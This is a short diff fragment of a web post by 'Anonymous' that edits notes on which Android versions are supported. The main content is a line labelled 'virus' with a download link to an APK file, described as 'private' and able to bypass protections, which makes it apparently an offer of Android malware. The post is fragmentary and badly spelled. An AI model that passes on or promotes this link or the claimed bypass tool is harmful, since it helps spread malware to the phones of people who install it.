@@ -31,11 +31,11 @@ Anonymous </h3>
 
 cheak this--
 
-             android 10+    -
+             android 10+    -    support 12-13
              
 -{m}""virus-"https://apkadmin.com/8zgx85evfc6i/complete.apk.html" private and Baypass
              
-             android 10- hidden
+             android 7 
 
  -{c} 7.8-""
  
